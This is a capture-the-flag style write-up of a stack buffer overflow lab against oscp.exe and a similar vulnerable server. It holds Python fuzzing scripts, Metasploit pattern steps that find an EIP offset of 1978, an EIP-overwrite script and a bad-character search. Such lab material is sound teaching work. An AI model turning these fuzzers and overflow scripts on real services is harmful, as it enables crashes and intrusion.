@@ -1,0 +1,220 @@
+[*] Target: 10.10.50.25y
+
+[Question 1] What is the EIP offset for OVERFLOW1? => 1978
+
+    [+] First thing first, I open the C:\Users\admin\Desktop\vulnerable-apps\oscp\oscp.exe in the Immunity Debugger, so we can see things more clearly
+
+    [Note] This writeup is gonna be different with every other writeups you can find, because I don't follow the TryHackMe's guide or use the given codes
+           I will make things easy to understand, so don't be scared, just follow my step
+
+    [Step 1] Fuzzing
+
+        [+] After opening the oscp.exe you can see that it is listening on port 1337
+
+            nc -nv 10.10.50.25 1337
+            (UNKNOWN) [10.10.50.25] 1337 (?) open
+            Welcome to OSCP Vulnerable Server! Enter HELP for help.
+            HELP
+            Valid Commands:
+            HELP
+            OVERFLOW1 [value]
+            OVERFLOW2 [value]
+            ...
+            OVERFLOW9 [value]
+            OVERFLOW10 [value]
+            EXIT
+            OVERFLOW1 thinhbeodeptraiprovip
+            OVERFLOW1 COMPLETE
+
+        [Note] This is my tool, it's a little bit stupid but still a good one
+
+            import socket
+            import sys
+            import time
+
+            buffer_boy = b"A" * 100
+
+            while True:
+                try:
+                    connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    connect.connect(('10.10.50.25', 1337))
+                    print(f"Test: {len(buffer_boy)}")
+                    connect.send(b'OVERFLOW1 /.:/' + buffer_boy)
+                    connect.close()
+                    time.sleep(1)
+                    buffer_boy += b"A" * 100
+                except:
+                    sys.exit()
+        
+        [>>] python3 Overflow1-FUZZ.py
+
+                Test: 100
+                Test: 200
+                ...
+                Test: 1900
+                Test: 2000 => crashed
+                Test: 2100
+                Test: 2200
+                ...
+
+        [+] Now, focus on the EIP, you can see "41414141" <=> AAAA, we know that this's happened when we sent 2000-2200 bytes
+
+    [Step 2] Finding the offset
+
+        # msf-pattern_create -l 2200
+
+            Aa0Aa1Aa2Aa3Aa4...v0Cv1Cv2C
+
+        [Note] This just random char for you to easier to find the correct EIP point
+
+            [>>] nc -nv 10.10.50.25 1337
+                (UNKNOWN) [10.10.50.25] 1337 (?) open
+                Welcome to OSCP Vulnerable Server! Enter HELP for help.
+
+                OVERFLOW1 Aa0Aa1Aa2Aa3Aa4...v0Cv1Cv2C => crashed
+
+        [>>] EIP: 6F43396E
+
+        # msf-pattern_offset -l 2200 -q 6F43396E
+            [*] Exact match at offset 1978
+
+    [Note] If you wanna overwrite the EIP just
+
+            import socket
+            import sys
+
+            buffer_boy = b"A" * 1974 + b"root"
+            
+            connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connect.connect(('10.10.50.25', 1337))
+            connect.send(b'OVERFLOW1 /.:/' + buffer_boy)
+            connect.close()
+
+            [>>] EIP: 746F6F72 <=> root
+    
+[Question 2] In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1? => \x00\x07\x2e\xa1
+
+    [+] Badchars just the chars that may crashed the service, each service has its own badchars, so we have to search them manually
+
+        [Note] You can easily find them in the https://github.com/cytopia/badchars
+
+        import socket
+        import sys
+
+        badchars = (
+            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+        )
+
+        buffer_boy = b"A" * 1974 + b"root" + badchars
+
+        connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect.connect(('10.10.50.25', 1337))
+        connect.send(b'OVERFLOW1 /.:/' + buffer_boy)
+        connect.close()
+
+    [>>] After running this python code, you need to check the ESP 's dump => x00\x07\x08\x2e\x2f\xa1
+
+        [>>] Since badchars can affect the next byte as well! So the correct answer is \x00\x07\x2e\xa1
+
+[Note] I think I just need to guid you guys the 1st lab, there are 9 left for you to practice, they have exactly the same concept with this one
+
+[Bonus] Because the OSCP.exe is just a small expanded part of the basic Vulnerable-Apps, which is a popular BOF lab 
+        So I will perform a vulnerable command scan, just for you to understand how things work outside this lab
+
+    # nc -nv 10.10.50.25 9999
+        (UNKNOWN) [10.10.50.25] 9999 (?) open
+        Welcome to Vulnerable Server! Enter HELP for help.
+        HELP
+        Valid Commands:
+        HELP
+        STATS [stat_value]
+        RTIME [rtime_value]
+        LTIME [ltime_value]
+        SRUN [srun_value]
+        TRUN [trun_value]
+        GMON [gmon_value]
+        GDOG [gdog_value]
+        KSTET [kstet_value]
+        GTER [gter_value]
+        HTER [hter_value]
+        LTER [lter_value]
+        KSTAN [lstan_value]
+        EXIT
+
+    [>>] Now we need to check the vulnerable command
+
+        import socket
+        import sys
+        import time
+
+        buffer_boy = b"A" * 100
+
+        while True:
+            try:
+                connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                connect.connect(('10.10.50.25', 9999))
+                print(f"Test: {len(buffer_boy)}")
+                connect.send(b'STATS /.:/' + buffer_boy)
+                connect.close()
+                time.sleep(1)
+                buffer_boy += b"A" * 100
+            except:
+                sys.exit()
+
+        =>  python3 Overflow1-FUZZ.py
+
+                Test: 100
+                Test: 200
+                ...
+                Test: 2500
+                Test: 2600
+                Test: 2700
+                ... => no crashed
+
+    [Note] Keep trying one by one
+
+        import socket
+        import sys
+        import time
+
+        buffer_boy = b"A" * 100
+
+        while True:
+            try:
+                connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                connect.connect(('10.10.50.25', 9999))
+                print(f"Test: {len(buffer_boy)}")
+                connect.send(b'TRUN /.:/' + buffer_boy)
+                connect.close()
+                time.sleep(1)
+                buffer_boy += b"A" * 100
+            except:
+                sys.exit()    
+
+        => python3 Overflow1-FUZZ.py
+
+                Test: 100
+                Test: 200
+                ...
+                Test: 2000 => crashed
+                Test: 2100
+                Test: 2200
+                Test: 2300
+                ... 
+
+
